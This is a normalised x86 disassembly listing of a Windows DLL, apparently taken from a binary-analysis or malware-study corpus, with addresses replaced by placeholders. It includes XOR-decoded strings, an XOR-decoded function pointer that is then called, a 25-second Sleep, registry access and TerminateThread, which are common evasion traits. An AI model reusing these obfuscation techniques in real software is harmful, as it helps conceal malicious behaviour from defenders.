lea ecx [ ebp - 0x72c ]
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10047450
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x9
call sub_10026210
lea edx [ ebp - 0x78 ]
mov eax 0x5
call sub_10026210
mov eax edx
push eax
lea ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x934 ]
call sub_1002cb70
mov ecx [ ebp - 0x948 ]
push 0x1
push 0x0
mov eax ebx
mov edx 0x80000001
call sub_10047450
add esp 0x14
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xe
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24 ]
mov eax 0x6
call sub_10026210
lea edx [ ebp - 0x98 ]
mov eax 0x3
call sub_10026210
mov eax edx
push 0x1
push eax
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x934 ]
mov edx 0x80000001
call sub_10047450
add esp 0x8
neg eax
pop edi
sbb eax eax
pop ebx
and eax 0x10
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xf
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10002fc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10034e98
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001706d
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10069747
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10007e30
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_1002c57b
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10024fe9
lea ecx [ ebp + 0x8 ]
call sub_10069747
push esi
call sub_10062b65
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_100030fa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10058dba
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000313c
push 0x4c
mov eax sub_10085da7
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_1006b91f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1004a330
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005c1f0
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1003c519
mov eax ebx
call sub_1004642f
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_10024441
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov ebx [ ebp - 0x58 ]
sub_10003290
push ebp
mov ebp esp
push 0xffffffff
push sub_1008935b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9c ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
xor esi esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x85 ] bl
mov [ ebp - 0x98 ] esi
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x24 ] 0x10
mov eax [ ebp + 0x10 ]
jae r-xdata
push 0xdac
call [ Sleep@IAT ]
mov eax 0x43
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x9c ]
mov ecx [ ecx + 0xec ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
lea esi [ ebp - 0x90 ]
push esi
lea esi [ ebp - 0x8c ]
push esi
lea esi [ ebp - 0x94 ]
push esi
mov esi [ ebp + 0x20 ]
push esi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x24
mov esi [ ebp - 0x98 ]
mov eax [ ebp - 0x8c ]
inc esi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov ecx [ r--data ]
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0x1c
jb r-xdata
xor eax eax
push edi
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x14 ] ax
call sub_10045cc0
add esp 0x4
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005bbc0
add esp 0x4
mov edx eax
mov ecx 0xfa
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x54 ] esi
jb r-xdata
cmp esi 0x5
jg r-xdata
cmp [ ebp - 0x94 ] 0xc8
jne r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx ebx
je r-xdata
xor edx edx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] dx
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_100187af
add esp 0x4
cmp [ ebp - 0x85 ] 0x1
jne r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x8c ] ebx
mov dl [ ecx + eax - 0x1 ]
cmp dl 0xa
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
mov [ ecx + eax - 0x1 ] bl
mov ecx [ ebp - 0x90 ]
mov eax [ ebp - 0x8c ]
dec ecx
mov [ ebp - 0x90 ] ecx
cmp dl 0x20
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
push edx
call sub_100187af
add esp 0x4
push eax
lea ecx [ ebp - 0x90 ]
call sub_1003cd30
cmp eax ebx
mov eax [ ebp - 0x8c ]
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x85 ] 0x1
sub_10003510
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0xbc ] 0x0
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff6
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x14
jb r-xdata
xor eax eax
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x78 ]
call sub_1005ddc0
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebx + 0x88 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x78 ]
call sub_1001a2f0
test eax eax
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x3f
call sub_10053240
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x88 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
lea ecx [ ecx ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x94 ]
call sub_1005ddc0
mov ecx [ ebp - 0xc0 ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0xb8 ]
mov eax 0x109
call sub_10053240
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0xb8 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
lea esi [ ebx + 0xb0 ]
push esi
call sub_100453a0
mov ecx [ ebp - 0xc0 ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_1001a2f0
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x7e
call sub_10053240
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
add ebx 0xcc
push ebx
call sub_100453a0
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov esi r--data
mov ecx ebx
call sub_1004cb20
mov ecx [ ebp - 0x4 ]
movzx eax al
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x8
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1000380f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_10041a47
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1000fcd9
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_10041a47
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
push esi
call sub_10041a47
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10041a47
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10041a47
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10041a47
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_10041a47
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10041a47
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10041a47
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10041a47
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10012efb
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10041a47
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10041a47
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_100091c8
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1007f40d
pop ecx
pop ebp
retn 0xc
call sub_1005d8f2
sub_100039c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ebx ebx
push edi
mov edi 0x1
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
push ebx
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] ebx
mov eax edi
pop edi
mov [ esi + 0x94 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x90 ] ebx
sub_10003a38
push 0x8
mov eax sub_10085431
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1002f11b
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10007a90
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10017f00
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10017f00
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10017f00
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_100578b0
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_100578b0
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10013ab8
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f5d0
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f5d0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048a74
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10048a74
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10003b92
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100101f0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10003c30
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a1b4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x49c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x4a4 ] eax
mov eax [ esi + 0x10 ]
lea edx [ eax + eax ]
push edx
push 0x8
mov [ ebp - 0x4a8 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_1005ddc0
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xa8 ]
mov edi ebx
mov [ ebp - 0x4 ] 0x0
call sub_10048ba0
lea esi [ ebp - 0x4a0 ]
call sub_100288b0
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10017080
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
add ecx ecx
push ecx
push eax
push edi
call sub_1007f5d0
mov esi [ esi + 0x10 ]
add esp 0xc
lea edx [ ebp - 0x24 ]
mov eax 0x56
add esi esi
call sub_10045930
xor edx edx
lea eax [ ebp - 0x24 ]
mov [ ebp - 0xa8 ] dx
mov [ ebp - 0x94 ] 0x7
mov [ ebp - 0x98 ] 0x0
lea edx [ eax + 0x2 ]
mov edx [ ebp - 0x49c ]
mov ecx [ ebp - 0x4a4 ]
mov eax [ ebp - 0x498 ]
mov edi [ ebp - 0x4a8 ]
mov [ ecx ] edx
mov [ edi ] eax
call sub_10014c90
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x15c
call sub_10045930
lea ecx [ ebp - 0xc4 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ ebx + 0x10 ]
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
lea ecx [ ebp - 0x4a0 ]
push ecx
mov [ ebp - 0x4 ] bl
call sub_10047e70
cmp [ ebp - 0x94 ] 0x8
jb r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x139
call sub_10045930
lea ecx [ ebp - 0xc4 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x10
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] ax
cmp [ ebp - 0xb0 ] esi
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
mov edx [ ebp - 0xa8 ]
push edx
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] ax
cmp [ ebp - 0xb0 ] esi
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x4a0 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10047e70
cmp [ ebp - 0x94 ] esi
jb r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x4a0 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10047e70
cmp [ ebp - 0x94 ] esi
jb r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call sub_100187af
add esp 0x4
sub_10003f50
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
push esi
call sub_1004af10
lea ecx [ edi + 0x20 ]
push ecx
push esi
call sub_1004af10
push edi
push esi
call sub_10021f70
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10003f90
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
lea ecx [ edi * 8 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x2
lea eax [ edx + edx * 2 ]
lea ecx [ eax + eax ]
lea eax [ edi * 8 ]
sub eax ecx
sub eax 0x2
je r-xdata
add edx 0x3
sub eax 0x2
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax 0xaaaaaaab
mul edi
shr edx 0x1
push ebx
